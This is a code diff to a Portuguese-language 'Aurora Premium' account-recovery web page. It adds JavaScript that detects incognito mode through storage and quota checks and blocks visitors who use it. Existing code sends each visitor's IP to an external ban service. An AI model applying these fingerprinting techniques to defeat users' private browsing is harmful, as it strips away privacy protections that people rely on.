@@ -2120,9 +2120,85 @@
     </div>
 
     <!-- ============================================================ -->
-    <!-- ===== SCRIPT CORRIGIDO ===== -->
+    <!-- ===== SCRIPT CORRIGIDO COM DETECÇÃO DE INCÓGNITO ===== -->
     <!-- ============================================================ -->
     <script>
+        // ============================================================
+        // 0. DETECÇÃO DE MODO INCÓGNITO (FRONTEND)
+        // ============================================================
+        function detectIncognito() {
+            return new Promise((resolve) => {
+                let detected = false;
+                let checksDone = 0;
+                const totalChecks = 4;
+
+                function checkDone() {
+                    checksDone++;
+                    if (checksDone >= totalChecks) {
+                        resolve(detected);
+                    }
+                }
+
+                // ===== MÉTODO 1: localStorage =====
+                try {
+                    const testKey = '__incognito_test__';
+                    localStorage.setItem(testKey, '1');
+                    localStorage.removeItem(testKey);
+                } catch (e) {
+                    detected = true;
+                }
+                checkDone();
+
+                // ===== MÉTODO 2: sessionStorage =====
+                try {
+                    const testKey = '__incognito_test__';
+                    sessionStorage.setItem(testKey, '1');
+                    sessionStorage.removeItem(testKey);
+                } catch (e) {
+                    detected = true;
+                }
+                checkDone();
+
+                // ===== MÉTODO 3: IndexedDB =====
+                try {
+                    const request = indexedDB.open('__incognito_test__');
+                    request.onerror = () => {
+                        detected = true;
+                        checkDone();
+                    };
+                    request.onsuccess = () => {
+                        if (request.result) {
+                            request.result.close();
+                        }
+                        checkDone();
+                    };
+                } catch (e) {
+                    detected = true;
+                    checkDone();
+                }
+
+                // ===== MÉTODO 4: Storage Quota (Chrome) =====
+                if (navigator.storage && navigator.storage.estimate) {
+                    navigator.storage.estimate().then(estimate => {
+                        // Chrome Incognito: quota < 120MB
+                        if (estimate.quota < 120000000) {
+                            detected = true;
+                        }
+                        checkDone();
+                    }).catch(() => {
+                        checkDone();
+                    });
+                } else {
+                    checkDone();
+                }
+
+                // ===== TIMEOUT DE SEGURANÇA =====
+                setTimeout(() => {
+                    resolve(detected);
+                }, 3000);
+            });
+        }
+
         // ============================================================
         // 1. DETECÇÃO DE NAVEGADOR ANÔNIMO E VPN
         // ============================================================
@@ -2346,13 +2422,13 @@
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const ip = ipData.ip;
-                
+
                 // 🔥 USA A URL COMPLETA
                 const banRes = await fetch(`https://aurora-plum.vercel.app/api/ban?check=${ip}`);
                 const banData = await banRes.json();
-                
+
                 console.log('🔍 Dados do ban:', banData); // <- DEBUG
-                
+
                 if (banData.banned) {
                     isUserBanned = true;
                     const ban = banData.ban || banData;
@@ -2548,6 +2624,14 @@
         // ============================================================
         async function handleSubmit(e) {
             e.preventDefault();
+
+            // ===== VERIFICAR MODO INCÓGNITO =====
+            const isIncognito = await detectIncognito();
+            if (isIncognito) {
+                showNotification('🔒', 'Modo Incógnito!', 'O modo incógnito não é permitido. Desative para continuar.');
+                return;
+            }
+
             if (isUserBanned) { showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido.');
                 return; }
             if (!termsAccepted) { openTerms();
@@ -2724,6 +2808,25 @@
             console.log('%c✨ Aurora Premium v3.0 ✨', 'font-size:24px;font-weight:bold;color:#7c3aed;');
             console.log('%c🔒 Sistema de Recuperação de Contas', 'font-size:16px;color:#c084fc;');
             console.log('%c⏳ 1 tentativa | 9h de bloqueio', 'font-size:14px;color:#f59e0b;');
+
+            // ===== DETECTAR MODO INCÓGNITO PRIMEIRO =====
+            const isIncognito = await detectIncognito();
+
+            if (isIncognito) {
+                console.log('🚫 Modo Incógnito detectado!');
+                const modal = document.getElementById('blockModal');
+                document.getElementById('blockTitle').textContent = '🔒 Modo Incógnito!';
+                document.getElementById('blockIcon').textContent = '🕵️';
+                document.getElementById('blockReason').textContent = '🔒 Modo Incógnito/Anônimo Detectado';
+                document.getElementById('blockReason').parentElement.className = 'reason-box';
+                document.getElementById('blockDesc').textContent = 'O modo incógnito não é permitido por questões de segurança. Desative o modo incógnito para acessar.';
+                document.getElementById('blockBtn').className = 'btn-block-action';
+                document.getElementById('blockBtn').innerHTML = '<i class="fas fa-sync-alt"></i> Tentar Novamente';
+                document.getElementById('blockBtn').onclick = () => window.location.reload();
+                modal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+                return;
+            }
 
             const isPrivate = await detectPrivateBrowsingBrowser();
             if (isPrivate) {
